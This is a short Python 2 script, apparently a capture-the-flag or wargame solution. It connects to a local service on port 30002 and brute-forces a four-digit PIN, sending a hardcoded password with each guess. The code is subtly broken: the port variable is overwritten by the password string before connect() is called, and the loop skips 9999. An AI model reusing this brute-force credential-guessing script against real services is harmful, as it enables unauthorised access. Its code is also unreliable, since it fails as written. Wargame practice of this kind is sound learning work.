import socket
s=socket.socket()
h="localhost"
p=30002
p="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
s.connect((h,p))
d=s.recv(1024)
print d
for i in range(0,9999):
    c=str(i).zfill(4)
    print c
    s.send(p+" "+c+"\n")
    d=s.recv(100)
    print d
